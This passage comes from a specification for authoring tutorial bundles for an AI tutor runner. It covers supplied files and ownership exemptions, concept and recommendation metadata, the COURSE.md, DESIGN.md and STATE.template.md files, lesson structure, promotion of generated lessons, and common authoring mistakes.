policy applies to it exactly as it did before this key existed. The one other exemption a
runner has is the transitional fallback in `runner-protocol.md` section 10.1, for a course
written before the key; it is create-only, it reaches only files the bundle already ships,
and the repair it names is this key.

**`on-request` gets the same exemption, and needs it for the same reason.** That policy
lets the tutor edit learner files when it is asked, and placing a declared supply is not
the tutor being asked — without the exemption a course using it would have to interrupt
the learner for permission to unpack its own fixtures. `unrestricted` needs no exemption
at all. Under every policy it is the create half that the declaration grants: **placement
never rewrites a file that is already there**, whatever the policy would otherwise allow.

**And what is not declared is not reached.** A tutor that generates a project layout, rather
than placing files the bundle ships, is outside this exemption entirely — there is no
`supplies` entry naming those paths, so nothing here applies to them and
`tutor-must-not-edit-learner-owned` simply forbids the work. That is not an oversight to
route around: the narrowness is the whole of the exemption's value, and widening it to cover
paths nobody declared would make the declaration list the lever the policy exists to deny.
A course that needs such a scaffold says so with `ownership_policy`, at the cost stated in
section 2.

The narrowness is the point, and it is worth one sentence of history. A generated course
met this exact problem — a starter file under `src/**` that the tutor was forbidden to put
there — and "fixed" it by setting `ownership_policy: unrestricted`, trading away the
guarantee that the tutor will not write the learner's code across all eighteen of its
lessons in exchange for one bootstrap. One `supplies` entry was the whole fix. A reader
who takes the exemption to be broader than create-only will make that trade again.

The author-side limit at the top of this section is what keeps the other door shut: a
declaration list that may hand over anything is `unrestricted` by another name.

#### Older runners

`supplies` is additive to `bundle_format: 1`, exactly as `optional_lessons` and
`failure_modes` are. A bundle that declares none is valid as it stands, and no edit is
implied. A runner that predates the key reads `tutorial.yaml`, does not recognise it, and
ignores it: the files are never placed, and the learner puts them where the course says by
hand. That is the failure those courses have **today** — a lesson that assigns a copy — and
not a new one the key introduces. Section 13.

#### Supplied material and section 6

A file some entry's `from` covers **satisfies section 6's material-naming rule**, whether it
is named directly or lies under a directory `from`. Section 6 requires a lesson folder's
material to be named by its `LESSON.md`, because a file the lesson never mentions is
unreachable. A supplies entry says strictly more than a prose mention does: it names the
file, says where it goes, says what it is, and the runner acts on it. Every other file in
the folder still needs naming in the body.

**Any declaration clears it, not only the owning lesson's.** A lesson folder's material
may be supplied by a manifest entry, or by another lesson's entry, and it is covered
either way — a file is discoverable because it is declared somewhere, not because the
folder it sits in declared it.

#### When a target already exists

This is the sharpest edge the key has, and it belongs in prose rather than in a rules table.
A lesson-scope entry lands in a workspace the learner has been working in for hours. Its
target may already exist because *they* made it — the same path, their own content, under a
`learner_owned` glob — and no declaration in your bundle can know that.

The file is left exactly as it is, and it is **named in the report**. The runner says which
files it placed and which it found already present and left alone, so a learner never has to
wonder whether the work they did last session was quietly replaced by the course's copy of
the same filename, and never has to run a diff to find out. Silently overwriting a learner's
work is the worst outcome this format could produce; reporting nothing at all is the second
worst, because it leaves them unable to tell the two apart.

So choose `to` paths that will not collide with the learner's own by accident, and where a
collision is genuinely likely — a starter file a learner may well have written for
themselves — say so in `describe`. That sentence is what they are reading at the moment it
matters.

#### A note on revision

A supplied file is author-supplied content sitting in the learner's workspace, so it drifts
when the bundle is revised, in exactly the way a lesson copy does. The runner's position on
that is **detect and report, never auto-apply**. Nothing in this format re-places a file
that is already there, and nothing in it currently detects the drift either. Do not write a
course that depends on a supplied file being refreshed part-way through a learner's run.

### Concepts and relationships — `covers`, `assumes` and the two recommendation lists

> A bundle **MAY** declare what it teaches (`covers`), what it assumes (`assumes`), and
> which other bundles are worth taking before and after it
> (`recommended_previous_bundles`, `recommended_follow_ups`).

One rule decides every question this section can raise, and it is worth keeping even if you
keep nothing else from it:

> **Named bundles are recommendations. Concepts are the educational contract. Neither one
> gates access to a tutorial or requires proof that another bundle was completed.**

Nothing here stops a learner starting a course. There is no `requires_completion`, no
`requires_bundle`, and no spelling of either — a recommendation is something a learner reads
and decides about, and an assumed concept is something they judge themselves against. A
runner shows `assumes` before the first task and shows recommendations at the end, and in
both cases the learner decides what happens next.

```yaml
covers:
  retained-event-logs:
    summary: >
      Records remain available after they are delivered, and can be replayed from a
      logical offset rather than resent by the producer.
    aliases: [append-only-log, replayable-log]

assumes:
  go-programming:
    level: working          # awareness | conceptual | working | advanced
    summary: >
      Write, test, and refactor ordinary Go programs using packages, goroutines,
      channels, errors, and contexts.

recommended_follow_ups:
  - bundle: distributed-log-broker
    because: >
      Extend the broker with multi-node placement, replication, acknowledgement policies,
      and recovery from the loss of a node.

recommended_previous_bundles:
  - bundle: durable-event-broker
    because: >
      It teaches the retained-log, topic-partition and offset model used here.
```

#### Concept identifiers

A concept id matches `[a-z0-9-]+`. It names a **technical concept**, never a lesson
filename: `partition-offsets`, not `04-offsets`. It is stable once published, because other
authors' bundles quote it, and it is deliberately usable across independently written
courses. **There is no central registry.** Two authors who both teach retained logs and both
call the concept `retained-event-logs` have interoperated, and nothing had to coordinate
them.

#### `covers` — what the course teaches

`summary` is required; `aliases` is optional. This is machine-readable discovery metadata,
and it is more precise than `subjects`, which keeps its current meaning for broad
classification. A learner searching for a concept is matched against `covers`; a learner
browsing a topic is matched against `subjects`. Both stay.

Not every minor topic belongs here. List the concepts that are meaningful for discovery and
for another author's `assumes` — the ones a learner would name when saying what they want to
learn, or what they already know.

A `covers` concept should also be recognisable in `COURSE.md`, and the coverage list is the
natural place for it. The validator warns, conservatively, when a concept appears nowhere in
`COURSE.md` under any spelling; it never rejects, because a course whose prose uses different
words is not a broken course. **Use one name in both places**, which is the same rule the
coverage list already asks for, or add the course's wording to that concept's `aliases`.

#### `assumes` — what the course does not teach

`level` and `summary` are both required. The summary is written for a **prospective learner
deciding whether this course is for them**, so it has to be specific enough to self-assess
against. "Knows Go" is not; the example above is.

| Level | Means |
|---|---|
| `awareness` | recognise the concept and its purpose |
| `conceptual` | explain the model and its major consequences |
| `working` | apply it in ordinary implementation or diagnosis |
| `advanced` | reason about difficult edge cases and trade-offs without introduction |

**`assumes` is never an access-control or completion gate.** A runner shows it, the learner
reads it and continues, asks about a concept, or asks which bundles cover one. Continuing
acknowledges the wish to proceed and nothing else: it asserts no mastery and marks no other
course complete. Nothing inspects licences, completion records or prior instances to decide
whether a learner may begin.

**A concept may appear in both `covers` and `assumes`, and that is legal.** A course that
assumes a baseline and then teaches the same concept deeper is describing itself accurately,
and saying so is better than being forced to pick one key. `tests/fixtures/streaming-query-engine`
does exactly this with `windowed-aggregation`: `awareness` assumed, and the real treatment
taught.

#### Aliases

`aliases` is the other terms a learner might say for one concept. Two aliases are the same
alias when they differ only in case or punctuation: every run of non-letter, non-digit text
is one separator, so `append-only-log`, `Append Only Log` and `append_only_log` are one alias
written three ways and declaring two of them is reported. `node.js` and `nodejs` are one
alias too, which is what a learner typing either of them means. This is the same folding a
concept query uses at runtime, which is why the rule is worth knowing: an alias is written to
be matched against a concept id, and a concept id is `[a-z0-9-]+`, so punctuation cannot
survive into one anyway. Two bundles by different authors are free
to use the same alias for different things — that is expected, and nothing reports it. Within
**one** bundle, an alias that is also a concept id, or that two concepts share, makes an exact
search ambiguous; the validator warns and the bundle stays valid.

#### The recommendation lists

`bundle` and `because` are both required, and the entry has no other keys. `because` is the
sentence a learner reads when deciding what to do next, so write it for them. **Author order
is display order.**

| Rule | Why |
|---|---|
| A referenced bundle **need not exist** | A bundle is distributed on its own. It must never become invalid because another bundle is missing, unpublished, or not installed here. |
| Reciprocity is **not** required | A third party attaches itself to an established course by naming it, without that author changing anything. |
| A bundle **may not** recommend itself | A recommendation points at a different course. |
| One bundle **may not** appear twice in one list | Author order is display order, so a duplicate shows one course twice. |
| A recommendation implies **nothing** about ownership, purchase, installation or completion | It is a sentence, not a dependency. |

`recommended_previous_bundles` is the half that makes the design open-ended. A bundle that
names an earlier one attaches itself to that course **without modifying it**, and discovery
finds it through the reverse index. The established author never has to agree, or know.

**Starting a recommended follow-up is exactly like starting any other bundle.** No completion
proof, no earlier instance, no earlier licence. Where the learner's baseline source code comes
from is the workspace and template contract's job (`workspace_kind`), never something inferred
from a recommendation: `recommended_previous_bundles` says *this is a good course to take
earlier*, never *copy that course's workspace into this one*.

#### The normative example

Three bundles, as the smallest complete ones that can carry the relationships. They live in
`tests/` rather than in `examples/`, deliberately — three materialisable courses would bloat
every plugin install to illustrate a documentation point.

`tests/fixtures/durable-event-broker/tutorial.yaml` covers four concepts and points forward
at two courses, neither of which exists anywhere:

```yaml
id: durable-event-broker

covers:
  retained-event-logs:
    summary: >
      Records remain available after they are delivered, and can be replayed from a
      logical offset rather than resent by the producer.
    aliases: [append-only-log, replayable-log]
  partition-offsets:
    summary: >
      A partition is an ordered sequence, and a reader's position in it is one integer
      the broker never advances on the reader's behalf.
    aliases: [stream-offsets]
  topic-partitions:
    summary: >
      A topic is divided into partitions so writers and readers scale independently.
      Order is promised per partition, never across a topic.
  group-commit:
    summary: >
      Many appends are made durable in one fsync, so throughput rises without weakening
      the durability each individual writer was promised.

recommended_follow_ups:
  - bundle: distributed-log-broker
    because: >
      Extend the broker with multi-node placement, replication, acknowledgement policies,
      and recovery from the loss of a node.
  - bundle: streaming-query-engine
    because: >
      Run continuous queries over the log this course builds, instead of writing a
      bespoke consumer for every question.
```

`tests/fixtures/streaming-query-engine/tutorial.yaml` points back at the broker, and assumes
the concepts the broker covers:

```yaml
id: streaming-query-engine

assumes:
  retained-event-logs:
    level: working
    summary: >
      Read and append to a log whose records stay available after delivery, and reason
      about replay from an offset.
    aliases: [append-only-log]
  windowed-aggregation:
    level: awareness
    summary: >
      Recognise that a stream aggregate is computed over a bounded window rather than
      over the whole stream.

covers:
  windowed-aggregation:            # assumed at 'awareness', taught properly here
    summary: >
      Compute an aggregate over a bounded window of time or count, and decide what a
      late record does to a window that has already emitted.

recommended_previous_bundles:
  - bundle: durable-event-broker
    because: >
      It teaches the retained-log, topic-partition and offset model this engine queries,
      and you finish it holding a broker to point this engine at.
```

`tests/fixtures/event-stream-recipes/tutorial.yaml` is the case the whole design exists for.
It is by a third party, it names the broker, and **the broker says nothing about it**:

```yaml
id: event-stream-recipes

recommended_previous_bundles:
  - bundle: durable-event-broker
    because: >
      It builds the broker these recipes operate on, and it teaches the retained-log and
      offset model every recipe here assumes.
```

A learner finishing `durable-event-broker` is still shown these recipes, found through the
reverse index. The broker's author changed nothing, agreed to nothing, and does not need to
know the recipes exist.

#### An empty declaration is silent; a malformed one is not

`covers:` with nothing under it, `covers: {}`, `recommended_follow_ups: []` and the absent
key all declare nothing and all mean the same thing. A value that is present and is the
wrong **shape** is always reported: `covers` as a bare list of ids loses the summaries that
make a concept mean anything, and a recommendation written as a mapping straight under the
key, with the `- ` left off, is the commonest typo of the four. This is the same treatment
`optional_lessons` and `supplies` already get, for the same reason.

#### What the validator will not do

It never reports an unresolved bundle id. It sees one bundle and no catalogue, so it checks
that a referenced id is *well formed* and stops there — and an unresolved id is correct, not
tolerated. It makes no judgement about whether the course really teaches what `covers` claims,
whether a level is honestly chosen, or whether a summary is specific enough. Those are yours.

---

## 3. `COURSE.md`

Stable, global course material. Written for a learner who has not started.

MUST contain:

- the overall goal of the course
- the teaching philosophy specific to this course
- a high-level map of the chapters or lessons, in order
- milestone or checkpoint structure, if the course has one
- the optional lessons the course carries, if it has any, marked as optional. They are
  not part of the order, so do not number them into the map

SHOULD contain: a coverage list, described below.

MAY contain: optional paths, prerequisites.

MUST NOT contain:

- any statement about what has been completed
- any statement about where a learner is
- `Status: Complete`, `In progress`, `Next`, `Current lesson`, `resume marker`,
  or any equivalent
- a snapshot of anyone's code

### The coverage list

> A `COURSE.md` **SHOULD** declare a **coverage list**: a section naming the topics the
> course must eventually cover.

Give it a heading that says what it is — "Rust coverage requirements", "Topics this course
must cover" — and then a plain list of topic names, one per line. Name each topic the way
a learner would ask about it (`lifetimes`, `interior mutability`, `error design`), not the
way one of your lessons happens to title it. A topic MAY have no lesson yet: the list
states what the course owes its learners, not what it currently contains.

Keep it a list of **topics**, not of lessons. A list that names lesson files duplicates
the chapter map above it, and the two then drift apart.

**What the list is used for at teaching time.** Every other part of `COURSE.md` is prose
for a learner to read. This one part is read by the tutor, mechanically, and it is the
reason the section is worth writing carefully rather than as an afterthought.

A tutor may write an extra lesson into one learner's instance when the course does not
carry what that learner needs (section 8). The hard case is a learner who is stuck, because
two opposite situations look identical from outside: stuck because a concept they need was
never taught, and stuck because the exercise is hard. The first wants a side lesson. The
second **is** the lesson, and writing anything for it takes the exercise away. Your
coverage list is what decides between them. The tutor names the concept blocking the
learner and looks it up:

| The blocking concept | What the tutor does |
|---|---|
| is in your list, and no completed lesson taught it | writes a side lesson for it — your course has a genuine hole here |
| is in your list, and was taught already | coaches, and writes nothing |
| is not in your list | tells the learner the topic is outside this course, rather than quietly widening it |

**A topic an optional lesson teaches is in the course.** Put it in the coverage list like
any other, and the first row above then resolves correctly: the tutor finds the topic
listed, finds an authored lesson that teaches it, and **offers that lesson** instead of
writing a side lesson for a hole the course does not have. `runner-protocol.md` section
8.9 is that rule. Leaving an optional lesson's topic out of the list produces the
opposite and worse outcome — every learner who needs it gets a different improvised
version of a lesson you already wrote.

**Word the entry so a tutor can match it**, which is a real obligation and not a style
note. Nothing in `optional_lessons` states what a lesson *teaches*: the tutor has the
lesson's path, its `offer_because`, and your coverage-list entry, and it may not open the
lesson to settle the question. So a topic listed as `stream time semantics`, offered by a
lesson at `lessons/event-time-and-watermarks.md`, whose `offer_because` talks about
delayed records, gives the tutor three vocabularies for one thing and no way to know they
are one thing. Use one name in all three places. This is the same rule that governs
everything else in this format — one word, one meaning — and here it decides whether an
authored lesson gets offered or improvised over.

So the list does two jobs at once: it records what the course owes, and it tells every
tutor teaching your course where your course stops.

**The coverage list and `covers` are the same claim to two readers.** The list is prose a
tutor matches a blocking concept against; `covers` is the machine-readable form another
bundle's `assumes` and a learner's search are matched against. Write both, and word them
the same way. The validator warns when a `covers` concept appears nowhere in `COURSE.md`
under any spelling — its id, a plain-words form of it, or one of its aliases — and it warns
rather than rejects because a course whose prose uses different words is not broken, only
harder to find. Either name the concept in the coverage list, or add the words `COURSE.md`
already uses to that concept's `aliases`.

**A bundle with no coverage list still works.** The tutor falls back to its own judgement
of whether a blocking concept is a missing prerequisite or intended difficulty, and makes
that call separately for every learner who gets stuck. Nothing breaks, and you lose the
only means the format gives you to say "that one is not mine to teach". Declare the list.

### Worked example of the mistake

A course playbook written during a live tutorial commonly ends up with progress recorded
in several places at once — a "current state" section near the top, per-lesson markers
inside the curriculum list, and a "resume marker" at the bottom. All three must agree,
and they drift.

When converting such a document into a bundle:

- the curriculum, minus the markers → `COURSE.md` and `lessons/`
- the durable subject decisions → `DESIGN.md`
- the teaching rules → `COURSE.md`
- **every trace of progress → deleted from the bundle entirely**

The progress is not lost. It lives in the learner's instance, which the runner creates.
It is simply not yours to write.

---

## 4. `DESIGN.md`

Durable decisions about the *subject* that later lessons depend on. For a database
course: the key model, the row model, temporal semantics, storage direction,
replication, and so on. For a compiler course: the IR shape, the calling convention.

This is subject knowledge, not learner progress.

**It is read by the tutor, and by nobody else.** A lesson's `design_refs` pulls the named
sections into the tutor's context and stops there: `runner-protocol.md` section 1 loads
"only the `DESIGN.md` sections whose anchors are listed in that lesson's `design_refs`",
and marks `DESIGN.md` in full as "never". The instance's copy is `tutor_owned` (section
2), and nothing in this format or the protocol tells the tutor to pass a definition on. A
term defined only in an anchor therefore reaches the learner when the tutor happens to
explain it and otherwise not at all — a shipped course put two symbols in one anchor and
nowhere else, and a learner met one of them six times across three lessons and its partner
never.

So define a term where its reader is. An anchor is the right home for the reasoning behind
a decision, which the tutor needs in order to teach it and to judge an answer against it.
It is the wrong home for a term the learner must understand at the first task: that one
belongs in `COURSE.md` or in the lesson, which is what the learner reads.

**Every section MUST have a stable anchor**, because lessons reference sections
individually and the tutor loads only the ones a lesson needs:

```markdown
## Key ordering {#key-ordering}

All encoded keys need a total order...

## Temporal semantics {#temporal-semantics}

Cell visibility is the half-open interval...
```

Anchors MUST be stable once published — a lesson pointing at `#key-ordering` breaks if
you rename it.

Include deliberately unresolved decisions, marked as such. They are useful context, and
a later lesson may be where they get resolved.

`DESIGN.md` is seeded by you and **grows during the course**: the tutor appends
decisions the learner makes. Seed the starting state.

---

## 5. `STATE.template.md`

The shape a fresh instance starts in. The runner copies this to `STATE.md` when a
learner begins, then keeps it updated.

```markdown
---
tutorial_id: rust-automaton-db
active_lesson: lessons/00-foundations.md
status: not-started
updated: null
---

## Last completed task

None. The course has not started.

## Concepts demonstrated

None yet.

## Decisions made in discussion

None yet.

## Known intentional or incomplete state

None yet.

## Accepted warnings

None.

## Next task

Begin the first lesson.

## Deferred items

None.
```

Requirements:

- `tutorial_id` MUST equal `id` in `tutorial.yaml`
- `active_lesson` MUST equal the first entry of `lessons` in `tutorial.yaml`
- `status` MUST be `not-started`
- the section headings above MUST all be present, even if empty

Author it for a learner who has not started. If your `STATE.template.md` mentions
anything that was completed, you have written an instance again.

---

## 6. Lessons

A lesson is **either** a single Markdown file **or** a folder containing `LESSON.md`
plus supporting material. Name lessons so they sort in order: `00-`, `01-`, `02-`.

```
lessons/
├── 00-foundations.md                  single file — use this unless you need material
└── 08-automaton-machinery/            folder — when the lesson ships material
    ├── LESSON.md                      required; exact name, exact case
    ├── worked-example.md
    └── assets/dafsa.svg
```

Both forms are lessons. They are identical in every other respect: same frontmatter,
same sections, same treatment by the runner.

Only `id` and `title` in frontmatter are strictly REQUIRED. The section list in
"Lesson file structure" below is the expected shape, and a lesson missing
"Completion conditions" is a lesson the tutor cannot decide when to leave — so write
them all unless you have a reason not to.

### When to use a folder

Use a folder when the lesson ships something alongside the prose — a diagram, a data
file, a longer worked example, a reference the learner opens on request. Use a single
file otherwise. A folder holding only `LESSON.md` is pointless; make it a file.

### Loading material — important

`LESSON.md` is the lesson. **Everything else in the folder is loaded only when
`LESSON.md` explicitly directs it to be.** A tutor does not read a lesson folder
wholesale, because the entire point of the format is that a tutor holds one lesson in
context, not a course.

So a folder lesson MUST name its material and say when to use it, with the one exception
stated below:

```markdown
For the state-merging walkthrough, read `worked-example.md`.
If the learner asks how minimisation differs from a trie, show `assets/dafsa.svg`.
```

Material that `LESSON.md` never mentions is unreachable. That is not a subtle failure:
the tutor has no way to know the file exists.

**The exception is material the bundle supplies.** A file a `supplies` entry covers —
named directly by a `from`, or lying under a directory `from` — is declared, placed and
described to the learner without the lesson body saying anything, so the naming rule does
not apply to it and the validator does not ask for it. Section 2, **Supplied files**,
says why: a declaration states strictly more than a prose mention does. Every other file
in the folder still MUST be named.

### Naming and ids

The lesson's slug is the file stem (`00-foundations.md` -> `00-foundations`) or the
folder name (`08-automaton-machinery/` -> `08-automaton-machinery`). The `id` in
frontmatter MUST equal that slug.

Anything under `lessons/` that is neither a top-level `.md` file nor a folder containing
`LESSON.md` is not a lesson. A folder directly under `lessons/` without a `LESSON.md` is
an error — it is either a broken lesson or material filed at the wrong level, and in
both cases something is silently unreachable.

### Lesson file structure

The same for both forms. A foldered lesson's `LESSON.md` looks exactly like this.

```markdown
---
id: 02-first-refactor
title: The first deliberate refactor
design_refs: [key-ordering]
validators: [cargo-check, cargo-test]
---

## Purpose

Why this lesson exists and what pressure motivates it.

## Prerequisites

What must already be true. Reference earlier lesson ids.

## Learning objectives

- objective one
- objective two

## Theory

The concepts the learner needs. Teach them; do not assume them.

## Concepts to teach

Named concepts the tutor must actually cover, not skip past.

## Constraints

What the learner's solution must and must not do.

## Suggested progression

A rough sequence of tasks. NOT a script of conversational turns.

## Completion conditions

Checkable conditions. Be specific enough that "looks plausible" is not enough.

## On completion, persist

What to record in the instance's DESIGN.md or STATE.md when this lesson finishes.

## Optional deeper paths

Material available if the learner asks. Not required.
```

### Frontmatter

| Field | Required | Meaning |
|---|---|---|
| `id` | MUST | Unique within the bundle. Match the lesson slug (file stem, or folder name). |
| `title` | MUST | Human-facing lesson name. |
| `design_refs` | SHOULD | `DESIGN.md` anchors this lesson needs. MUST all resolve. |
| `validators` | SHOULD | Validator names from `tutorial.yaml`. MUST all be declared. |
| `optional` | MUST on an optional lesson | `true`, on every lesson listed in `optional_lessons` and on no other. |
| `setup_validators` | MAY | Checks the runner performs itself when this lesson opens, before its first task, in the same two-field form the manifest key uses. See section 2, **Setup validators**. |
| `supplies` | MAY | Files this lesson hands the learner's workspace when it opens, in the same three-field form the manifest key uses. A lesson-scope `from` MUST resolve inside `lessons/` — anywhere inside it, though this lesson's own folder is the recommended home. Declaring `supplies` does not oblige a single-file lesson to become a foldered one. See section 2, **Supplied files**. |

`design_refs` is how a lesson stays cheap. A lesson about splitting a file into a
library declares only the anchors it truly needs. It does not pull in storage,
networking or replication design that belongs to a later chapter. List the minimum.

Listing an anchor puts the section in front of the **tutor**, and no further (section 4).
A term the learner has to understand is defined where the learner reads.

### Writing an optional lesson

An optional lesson is an ordinary lesson file in `lessons/`. Same frontmatter, same
sections, same material rules, same treatment once it is active. Three things differ:

- **it is listed in `optional_lessons`, not in `lessons`** (section 2). That list is also
  where its offer metadata lives, because the tutor must be able to offer it without
  opening it;
- **its frontmatter declares `optional: true`.** The manifest already knows, so this is a
  second statement of one fact — deliberately, in the same way `id` restates the slug. A
  lesson file that does not say it is optional reads as main path to everyone who opens
  it alone, including you, six months later. A main-path lesson MUST NOT declare it;
- **do not give it a number prefix.** The prefix is a convention that follows the main
  path's order, and an optional lesson has no position in that order. Name it
  `lessons/event-time-and-watermarks.md`, not `lessons/04b-event-time.md`. This is the
  same reasoning that keeps a number off a generated lesson (section 8).

Its completion conditions bind exactly like any other lesson's. *Optional* describes how
the learner arrives at the lesson, never how carefully it is taught or how it is left.

Compose it so it stands alone. It is reached from at least one point you named and possibly
from a failure several lessons later, so it cannot assume the learner arrived with a
particular task half-finished. State what it needs in *Prerequisites*, the same as any
lesson, and keep it short — a detour that costs more than the lesson it interrupts is a
detour nobody finishes.

### A lesson is not a script

Do not write the conversation. The tutor generates each task from the objectives, the
learner's current state, the actual workspace, and the learner's last response. Give it
objectives, constraints and completion conditions — not dialogue.

### Completion conditions must be checkable

Weak: *"the learner understands modules."*
Strong: *"`cargo test` passes with tests in `src/lib.rs` or `tests/`; `main.rs` declares
no types; the learner can explain why `pub` was required."*

---

## 7. Depth: write the lessons you need now

Detailed lesson files are only required for lessons a learner will reach soon. A long
course may keep its later chapters as a high-level map in `COURSE.md` and gain lesson
files as it goes.

A twenty-chapter course does not need twenty detailed lesson files to be valid. It needs
every entry in `lessons` to resolve and every listed lesson to be well-formed. Chapters
without a lesson file yet are simply not listed, and are added to `lessons` when written.

Know what this costs at teaching time. A tutor that reaches a chapter `COURSE.md` maps and
`lessons` does not carry may draft one into the learner's instance — a *main-path draft*,
section 8. That draft is one learner's, written against one learner's code, and it is not
your lesson until you promote it. The learner is told, in so many words, that the chapter
was not written and is being drafted as they arrive at it — so an unwritten chapter is
visible to them, not a seam they never notice.

Prefer a small number of good lessons over a large number of thin ones.

---

## 8. Generated lessons, and how to promote one

Something happens in an **instance** that you need to know about, because two parts of it
are yours.

During a course, a tutor may write a lesson into the instance's
`tutorial/lessons.generated/` — either a **side lesson**, a compact detour for a concept
the main path does not reach, or a **main-path draft**, a chapter `COURSE.md` maps that has
no lesson file yet. Those files are tutor-owned, they belong to one learner, and they carry
provenance frontmatter recording when they were written and why.

A third route produces one: the learner asks for a side lesson outright, on a topic outside
the lesson they are in. Those carry the same provenance, and `reason:` records that the
learner asked.

**`after:` is placement, and placement only.** It tells you where the lesson belongs in
the sequence, which is what step 7 of the promotion procedure below uses. It is not where
the learner went back to: a detour often starts part-way through a lesson, and the way
back is recorded separately, in the instance's `STATE.md`. So a detour placed after lesson
03 may well have returned the learner into lesson 04, and that is not a contradiction.

Whether a tutor may write a side lesson unprompted is decided against the coverage list
your `COURSE.md` declares (section 3). A concept in your list that no lesson taught is a
hole and gets a lesson; a concept your list does not name is reported to the learner as
outside the course instead. That is the mechanical use of the list, and it is why a bundle
that declares one keeps tighter control of its own scope.

### A bundle MUST NOT contain `lessons.generated/`

> A bundle **MUST NOT** contain a `lessons.generated/` directory, at any level.

This is the same class of error as shipping a `STATE.md`, and it means the same thing: you
have written an instance. The files in it describe what one learner needed, on one day,
about code that only they wrote.

Delete the directory. Anything in it that belongs to the *course* enters `lessons/` by the
promotion procedure below — which is more than a copy, because a generated lesson is
written for one learner and a bundle lesson is written for all of them.

For the same reason, do not list `tutorial/lessons.generated/**` in `tutor_owned`. That
directory belongs to an instance which does not exist while you are authoring, and the
runner owns it there without being told.

### Promotion

**Nothing flows from an instance into a bundle automatically.** Promotion is a deliberate
authoring act that you perform, on the bundle, using a generated lesson as source material.

1. **Copy the file into `lessons/`** — from the instance's
   `tutorial/lessons.generated/<slug>.md` — renamed to this course's numbering convention,
   for example `lessons/04-lifetimes-and-borrows.md`. Copy it; do not move it. The
   learner's instance keeps its own.
2. **Set `id` to the new slug.** The rename changed the slug, and `id` MUST equal it
   (section 6). Generated lessons carry no number prefix, so this step applies every time
   and is the easiest one to forget.
3. **Strip the provenance frontmatter**: `generated`, `generated_at`, `kind`, `reason` and
   `after`. All five. Each one describes one learner's run, and any one left behind puts
   progress into a bundle.
4. **Rewrite it for a learner who has not started.** It was written against one learner's
   code and it will name their types, their file, their error message. Generalise those.
   Section 0 is the test, and it is the same test that rejects a pasted snapshot of
   anybody's source.
5. **Check that `design_refs` still resolve.** This one is neither optional nor obvious:
   the instance's `DESIGN.md` **grows during a course**, so a generated lesson may point at
   an anchor the tutor appended, which your bundle's `DESIGN.md` has never had. For each
   anchor, either add the section to `DESIGN.md` or remove the reference.
6. **Check that every `validators` name is declared** in your `tutorial.yaml`.
7. **Add the path to `lessons`, at the right position.** For a side lesson that is normally
   directly after the lesson its `after:` named. For a main-path draft it is the position
   `COURSE.md` already maps. The list is the order; the filename prefix is a convention
   that follows the list, not the other way round.
8. **Update `COURSE.md`** when the course now covers a chapter its map did not mention.
9. **Say what happens to the learner's copy.** Promotion is a bundle-side act, so the
   instance that produced the draft still holds it, and the promoted lesson and the draft
   now share a slug. That is only a problem once that learner takes a revision of the
   bundle: at re-materialization the draft becomes a duplicate of an authored lesson and
   is reported. The tutor deletes the draft at that point. Until then the learner keeps
   working from their copy and nothing breaks.
10. **Re-run the self-check in section 10, and the validator.** A promoted lesson is a new
   lesson, and every rule in this document applies to it.

#### Promoting a side lesson as an *optional* lesson

A promoted side lesson does not have to join the main path. When the evidence says that
*some* learners need it at a particular point and others do not, the honest outcome is an
optional lesson: step 7 puts the path in `optional_lessons` instead of `lessons`, with
`offer_at` naming the lesson the drafts' `after:` values cluster around. Every other step
is unchanged, and `optional: true` goes into the frontmatter beside the `id` you fixed in
step 2.

That is also the moment to ask whether the detour was *anticipating* a failure. If the
reason a learner needed it was a mistake your course could see coming, declare the failure
mode and the next learner gets to defer it knowingly instead of meeting it blind. The
`reason:` fields you are already reading are where that pattern shows: three learners
detouring after the same lesson, for the same concept, is an anticipated failure with no
name yet.

A learner who is already partway through the previous revision does not receive the new
lesson. Revising a bundle while an instance is live has no reconciliation story yet.
Promotion improves the course for the learners who come after.

### Generated lessons are this course's quality signal

They are the only feedback the format gives you from real use, and it is good feedback,
because each one is a recorded moment where the course did not carry what a learner needed.

**Three learners all needing the same detour after the same lesson is not three side
lessons. It is a missing lesson, and the generated files are the evidence.**

Compare `kind`, `after:` and `reason:` across the instances you can see:

- **the same `after:`, from different learners** — the course has a hole immediately after
  that lesson. Promote the best of the drafts, or fold the material into the lesson before
  it.
- **the same concept at scattered points** — a prerequisite is missing, earlier than any of
  the detours.
- **repeated `main-path-draft`s after one chapter** — section 7 lets a course keep a later
  chapter as a map with no lesson file, and this is what that costs: every learner's tutor
  drafts it again, differently. Author the lesson.
- **one `side-lesson`, once** — usually one learner's background rather than a gap in the
  course. Evidence of nothing. Leave it.
- **a lesson the learner asked for** — `reason:` says so. That is one learner's curiosity
  or one learner's background, not a hole in your course. Take it as interest in the topic
  and weigh it far below a detour the tutor judged necessary. Several learners asking for
  the same topic is worth a look, but it is a signal about the topic, not about the lesson
  they were in when they asked.

`reason:` is the field that carries this signal, which is why the format requires it and
why it is written for you rather than for the learner.

---

## 9. Common mistakes

1. **Writing `STATE.md` into the bundle.** The most common. Delete it.
2. **Progress markers in `COURSE.md` or lessons.** `Complete`, `In progress`, `Next`.
   Delete them. They describe one learner.
3. **A `STATE.template.md` that is not empty of progress.** It must describe a learner
   who has not started.
4. **A lesson file that is in neither `lessons` nor `optional_lessons`.** It will
   never be reached, by walking or by an offer.
5. **`design_refs` pointing at anchors that do not exist**, usually after renaming a
   `DESIGN.md` heading.
6. **Lessons referencing validators not declared in `tutorial.yaml`.**
7. **Accepted warnings in `tutorial.yaml`.** Those belong to a learner's run.
8. **Lesson files written as dialogue.** Give objectives, not turns.
9. **Assuming the course builds software.** Set `workspace_kind: none` if it does not.
10. **Pasting a learner's current code into the bundle.** Source code belongs in the
   learner's workspace; the bundle describes what to build, not what was built.
11. **Renaming `id` after publication.** It is the stable identity.
12. **A lesson folder whose `LESSON.md` never mentions its own material.** The tutor
    cannot discover files the lesson does not name; they are dead weight. Material a
    `supplies` entry covers is the exception: it is declared, so it is discoverable
    without a mention (section 2).
13. **Shipping a `lessons.generated/` directory.** An instance was mixed into the bundle.
    Delete it, and promote what belongs to the course by section 8.
14. **Promoting a generated lesson with its provenance frontmatter still attached.**
    `generated`, `generated_at`, `kind`, `reason` and `after` all describe one learner's
    run. Strip all five.
15. **Promoting a generated lesson without re-checking `design_refs`.** The instance's
    `DESIGN.md` grew during the course; your bundle's did not.
16. **An optional lesson listed in `lessons` as well.** The main path is walked and an
    optional lesson is offered. Nothing can be both.
17. **An optional lesson with no `offer_at`.** Nothing reaches it, so it is as invisible
    as a lesson that is in no list at all.
18. **A failure mode no optional lesson anticipates.** It can never re-offer anything.
    Name it from a lesson, or delete it.
